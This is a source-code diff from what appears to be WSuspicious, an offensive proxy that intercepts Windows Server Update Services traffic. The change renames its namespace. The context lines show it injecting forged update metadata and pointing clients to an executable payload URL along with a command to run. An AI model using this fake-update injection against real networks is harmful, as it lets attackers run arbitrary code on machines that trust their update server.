@@ -10,7 +10,7 @@ using Titanium.Web.Proxy.EventArguments;
 using Titanium.Web.Proxy.Exceptions;
 using Titanium.Web.Proxy.Models;
 
-namespace WSUSProxy
+namespace WSuspicious
 {
     class Proxy
     {
@@ -218,7 +218,7 @@ namespace WSUSProxy
                 {
                     if (e.HttpClient.Response.StatusCode == (int)HttpStatusCode.OK)
                     {
-                        string newUpdatesTemplate = WSUSProxy.Properties.Resources.NewUpdatesTemplate;
+                        string newUpdatesTemplate = WSuspicious.Properties.Resources.NewUpdatesTemplate;
                         newUpdatesTemplate = String.Format(newUpdatesTemplate, updateID1, deploymentID1, uuid1, uuid2, updateID2, deploymentID2, uuid2);
 
                         XmlDocument newUpdatesNode = new XmlDocument();
@@ -268,7 +268,7 @@ namespace WSUSProxy
                     if (soapActionHeaders.Count > 0 && soapActionHeaders[0].Value.Contains("GetExtendedUpdateInfo"))
                     {
                         string payloadURL = "http://wsusisagoldmine:8530/Content/B2/FB0A150601470195C47B4E8D87FCB3F50292BEB2.exe";
-                        string secondPhaseTemplate = WSUSProxy.Properties.Resources.ExtendedUpdateInfoTemplate;
+                        string secondPhaseTemplate = WSuspicious.Properties.Resources.ExtendedUpdateInfoTemplate;
                         secondPhaseTemplate = String.Format(secondPhaseTemplate, updateID2, executedCommand, updateID1, updateID1, updateID2, payloadURL);
 
                         // TODO: I do not know if that works
